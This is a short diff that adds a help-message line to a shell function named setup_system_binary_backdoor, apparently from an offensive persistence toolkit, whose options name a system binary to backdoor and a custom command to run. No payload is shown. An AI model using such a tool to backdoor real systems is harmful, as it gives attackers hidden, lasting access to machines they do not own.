@@ -22,6 +22,7 @@ setup_system_binary_backdoor() {
 		echo "  --binary <binary>            Specify the binary to backdoor"
 		echo "  --command <command>          Specify the custom command to execute"
 		echo "  --warning                    This may interrupt your system.. Be careful!"
+		echo "--help|-h                    Show this help message"
 	}
 
 	while [[ "$1" != "" ]]; do
